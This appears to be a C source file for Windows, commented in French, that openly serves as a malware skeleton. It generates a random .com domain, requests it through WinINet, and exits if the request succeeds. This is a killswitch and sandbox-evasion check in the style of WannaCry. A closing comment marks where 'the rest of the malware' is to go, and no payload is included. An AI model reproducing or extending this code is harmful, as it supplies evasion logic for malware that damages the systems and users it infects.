#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")

const int RAND_URL_LEN = 40;

// Génère une chaîne aléatoire de lettres a-z
void generate_random_string(char *str, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length; i++) {
        int key = rand() % (sizeof(charset) - 1);
        str[i] = charset[key];
    }
    str[length] = '\0';
}

// Retourne true si la requête GET réussit (on a un handle valide)
int killswitch_triggered(const char *url) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) return 0;
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, 0);
    if (hConnect) {
        // Si on a un handle, l'URL existe (killswitch actif)
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    InternetCloseHandle(hInternet);
    return 0;
}

int main() {
    srand((unsigned int)time(NULL));
    char rand_domain[RAND_URL_LEN + 1];
    generate_random_string(rand_domain, RAND_URL_LEN);
    char url[256];
    snprintf(url, sizeof(url), "http://%s.com", rand_domain);
    printf("[*] Testing URL: %s\n", url);
    if (killswitch_triggered(url)) {
        printf("[!] Killswitch triggered! Exiting...\n");
        return 0;
    }
    printf("[+] No killswitch found. Continuing execution...\n");
    // Place le reste du malware ici
    return 0;
}
